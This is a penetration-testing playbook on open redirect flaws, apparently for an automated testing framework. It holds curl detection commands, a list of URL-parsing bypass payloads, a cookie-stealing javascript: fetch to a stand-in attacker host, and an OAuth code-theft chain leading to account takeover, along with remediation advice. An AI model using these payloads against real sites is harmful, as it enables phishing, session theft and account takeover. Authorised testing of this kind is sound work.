# Open Redirect — Skill Playbook

**Mitre ATT&CK ID:** T1204.001 (User Execution: Malicious Link)
**OWASP Mapping:** A01:2021 – Broken Access Control
**Severity:** Medium / Low
**Last Updated:** 2026-08-02

---

## Metadata

```yaml
skill_id: open-redirect-v1
category: penetration-testing
author: HiveBreach
mitre_attack_id: T1204.001
owasp_mapping:
  - A01:2021-BrokenAccessControl
tags:
  - open-redirect
  - redirect
  - oauth
  - token-theft
  - T1204.001
  - web-application
environments:
  - web
  - browser
  - oauth
verification_required: sandbox
```

---

## 1. Detection

### 1.1 Redirect Parameter Names

Look for parameters commonly used as redirect targets:
```
next, redirect, return, returnUrl, return_to, url, goto, target, dest, destination,
continue, relay, rurl, link, out, view, login_url, image_url, redirect_uri, u
```

### 1.2 Where Redirects Appear

- Login/logout pages (`/login?next=/dashboard`)
- OAuth authorize endpoints (`redirect_uri`)
- 302 landing pages after form submits
- Referer-based redirects (`/redirect.php` using `Referer` header)
- Meta-refresh / JavaScript `window.location` on payment or confirmation pages

### 1.3 Detection Process

```bash
# Observe redirect behaviour
curl -sI "https://target.com/login?next=https://evil.com"
# HTTP/1.1 302 Location: https://evil.com -> open redirect

# Track full redirect chain
curl -sIL "https://target.com/redirect?url=http://evil.com"
```

---

## 2. Confirmation

### 2.1 Baseline vs Payload Comparison

```bash
# Baseline
curl -sI "https://target.com/login?next=/dashboard" | grep -i location
# /dashboard (internal) -> expected

# Payload
curl -sI "https://target.com/login?next=https://evil.com" | grep -i location
# https://evil.com -> open redirect confirmed
```

### 2.2 Confirm the Browser Follows It

Use `curl -L` with `-w "%{url_effective}"` to confirm the final landing host is attacker-controlled.

---

## 3. Exploitation

### 3.1 URL Parsing Bypasses

**`@` trick (everything before @ ignored by browsers):**
```
https://target.com/login?next=https://evil.com@legit.com
https://target.com/redirect?url=http://evil.com@target.com
```

**Backslash / mixed slashes:**
```
https://target.com/login?next=\evil.com
https://target.com/login?next=//evil.com
https://target.com/login?next=/\/evil.com
https://target.com/login?next=https:%2F%2Fevil.com
```

**Protocol-relative redirect:**
```
https://target.com/redirect?url=//evil.com
//evil.com   (resolves to current scheme)
```

**Open redirect via whitespace/control chars:**
```
https://target.com/redirect?url= https://evil.com
https://target.com/redirect?url=%09https://evil.com
https://target.com/redirect?url=%0d%0aLocation:%20https://evil.com
```

### 3.2 `javascript:` and `data:` URIs

When the redirect target is passed into `window.location`, `location.href`, or `meta` refresh:
```
javascript:alert(document.domain)
javascript:fetch('https://evil.com/'+document.cookie)
data:text/html,<script>alert(1)</script>
```

### 3.3 DOM-Based Redirect

```html
<script>
  var u = new URLSearchParams(location.search).get('url');
  window.location = u;        // DOM open redirect
  location.href = base + u;   // check for // scheme confusion
</script>
```

### 3.4 Chaining to OAuth Token Theft

The classic token-theft chain:
1. Victim clicks `https://target.com/oauth/authorize?redirect_uri=https://target.com/login?next=//evil.com`
2. Legit OAuth issues a code to the allowed `redirect_uri`
3. The open redirect then forwards the `code`/`token` to `evil.com`
4. Attacker exchanges the code for a session token -> account takeover

```http
https://target.com/login?next=https://evil.com&code=OAUTH_CODE
```

### 3.5 Credential-Phishing Hybrid

- Point the redirect at a lookalike phishing page after a legitimate login
- Because the domain in the address bar is `target.com` initially, victims are conditioned to trust it

---

## 4. Tool-Specific Guidance

### 4.1 Mass Scanning with Nuclei

```bash
nuclei -u https://target.com -t ~/nuclei-templates/http/redirect/ -jsonl redirects.jsonl
# templates: open-redirect, generic-redirect
```

### 4.2 Mass Scanning with a parameter wordlist

```bash
# Enumerate redirect params on the app, then test each with curl
cat redirect_params.txt | while read p; do
  code=$(curl -s -o /dev/null -w "%{http_code} %{redirect_url}" \
    "https://target.com/login?$p=https://evil.com")
  echo "$p -> $code"
done
```

### 4.3 Burp Suite

- Right-click response -> Engagement tools -> "Find references" for redirect params
- Use Burp Intruder with a payload list of bypasses (section 7)
- Grep the response `Location` header for the injected domain

---

## 5. PoC Generation

### PoC Template

```markdown
## Open Redirect — [FINDING_ID]

**URL:** https://target.com/login?next=https://evil.com
**Parameter:** next
**Redirect type:** 302 / meta-refresh / DOM-based

### Payload
```
https://target.com/login?next=//evil.com
```

### Evidence
```
HTTP/1.1 302 Found
Location: //evil.com
```

### Impact
- OAuth token theft: YES/NO
- Credential phishing: YES/NO
- Used for malware delivery: YES/NO

### Remediation
- Allow-list redirect destinations (exact match on host)
- Reject schemes other than http/https and relative paths
- Validate the final resolved host server-side, not via string prefix checks

### Reproduction Steps
1. Access `/login?next=//evil.com`
2. Observe 302 to `//evil.com`
3. Chain with OAuth `redirect_uri` if present
```

---

## 6. Verification (Sandbox)

### Sandbox Checklist
- [ ] Redirect confirmed with 302 Location header evidence
- [ ] Parsing bypass variants (/, //, \\, @, %0d%0a) enumerated
- [ ] OAuth chain tested only against sandbox client
- [ ] `javascript:`/`data:` URIs only executed in controlled browser
- [ ] No user-visible phishing delivered outside sandbox

---

## 7. Cheat Sheet/Reference

| Bypass | Payload |
|---|---|
| Absolute URL | `?next=https://evil.com` |
| Protocol-relative | `?next=//evil.com` |
| Backslash | `?next=\evil.com` |
| `@` confusion | `?next=https://evil.com@legit.com` |
| Double slash | `?next=/\/evil.com` |
| Encoded | `?next=https:%2f%2fevil.com` |
| CRLF | `%0d%0aLocation:%20https://evil.com` |
| JS scheme | `?next=javascript:alert(1)` |
| Data scheme | `?next=data:text/html,<script>alert(1)</script>` |
| Subdomain lookalike | `?next=https://evil.com.target.com` |

---

## 8. Related Techniques (MITRE ATT&CK Mapping)

| Technique ID | Name | Relation |
|---|---|---|
| T1204.001 | User Execution: Malicious Link | Victim follows redirect |
| T1189 | Drive-by Compromise | Malware delivery chain |
| T1566.002 | Phishing: Spearphishing Link | Phishing delivery |
| T1539 | Steal Web Session Cookie | OAuth token theft |
| T1059.007 | JavaScript | DOM-based redirect |

---

## 9. References

- PayloadsAllTheThings Open Redirect: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect
- HackTricks Open redirect: https://book.hacktricks.xyz/pentesting-web/open-redirect
- PortSwigger Open redirect: https://portswigger.net/web-security/ssrf (redirect-based vectors) and https://portswigger.net/web-security/oauth
- OWASP Unvalidated Redirects: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect

---

*This playbook is for authorised security testing only. All verification must occur in sandbox environments.*
